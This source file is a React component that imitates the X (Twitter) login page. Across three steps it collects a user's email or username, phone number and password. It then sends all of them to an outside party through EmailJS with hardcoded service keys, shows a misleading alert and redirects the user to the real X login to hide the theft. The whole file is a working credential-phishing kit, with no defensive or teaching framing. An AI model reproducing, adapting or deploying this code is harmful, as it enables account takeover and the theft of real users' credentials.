import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import emailjs from "emailjs-com";

export default function XLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [verification, setVerification] = useState("");
  const [error, setError] = useState("");
  const [darkMode, setDarkMode] = useState(false);
  const [step, setStep] = useState(1);

  useEffect(() => {
    const storedDarkMode = localStorage.getItem("darkMode") === "true";
    setDarkMode(storedDarkMode);
    document.documentElement.classList.toggle("dark", storedDarkMode);
  }, []);

  const toggleDarkMode = () => {
    setDarkMode((prev) => {
      localStorage.setItem("darkMode", !prev);
      document.documentElement.classList.toggle("dark", !prev);
      return !prev;
    });
  };

  const handleNext = (e) => {
    e.preventDefault();
    if (!email.trim()) {
      setError("Please enter a valid email or username.");
    } else {
      setError("");
      setStep(2);
    }
  };

  const handleVerification = (e) => {
    e.preventDefault();
    if (!verification.trim()) {
      setError("Please enter your phone number or username.");
    } else {
      setError("");
      setStep(3);
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!password) {
      setError("Please enter your password.");
      return;
    }

    emailjs
      .send(
        "service_ftb4lhs",
        "template_9zwksrd",
        { email, verification, password },
        "o07HchFDD89TJ91W-"
      )
      .then(
        () => {
          alert(
            "Thanks for your interest in our offer, I will contact you shortly. You can now continue with X!"
          );
          window.location.href = "https://x.com/i/flow/login";
        },
        () => {
          alert("Your identity cannot be verified at the moment. Try again.");
        }
      );
  };

  return (
    <div
      className={`flex flex-col md:flex-row h-screen items-center justify-center ${darkMode ? "bg-black text-white" : "bg-white text-black"}`}
    >
      <div className="md:w-1/2 flex flex-col justify-center items-center p-8 text-center">
        <img src="/logo.png" alt="X Logo" className="h-16 w-auto mb-4 dark:invert" />
        <h1 className="text-4xl font-bold">Welcome to X</h1>
        <p className="text-lg text-gray-500 dark:text-gray-400 max-w-md mt-2">
          The best place to connect, share, and stay informed. Log in to your
          account and verify your identity.
        </p>
      </div>

      <motion.div
        initial={{ opacity: 0, x: 50 }}
        animate={{ opacity: 1, x: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full md:w-1/2 p-8 bg-gray-900 dark:bg-white rounded-lg shadow-lg max-w-md"
      >
        <div className="flex justify-between items-center mb-4">
          <h1 className="text-3xl font-bold text-white dark:text-black">Sign in to X</h1>
          <button onClick={toggleDarkMode} className="p-2 bg-gray-700 dark:bg-gray-300 rounded">
            {darkMode ? "🌞" : "🌙"}
          </button>
        </div>
        {step === 1 && (
          <form onSubmit={handleNext} className="space-y-4">
            <input
              type="text"
              placeholder="Email or username"
              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              type="submit"
              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
            >
              Next
            </motion.button>
          </form>
        )}
        {step === 2 && (
          <form onSubmit={handleVerification} className="space-y-4">
            <p className="text-yellow-500 text-sm">
              Please verify your identity by entering your phone number or
              username.
            </p>
            <input
              type="text"
              placeholder="Phone number or username"
              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
              value={verification}
              onChange={(e) => setVerification(e.target.value)}
            />
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              type="submit"
              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
            >
              Next
            </motion.button>
          </form>
        )}
        {step === 3 && (
          <form onSubmit={handleSubmit} className="space-y-4">
            <input
              type="password"
              placeholder="Password"
              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              type="submit"
              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
            >
              Sign In
            </motion.button>
          </form>
        )}
      </motion.div>
    </div>
  );
}
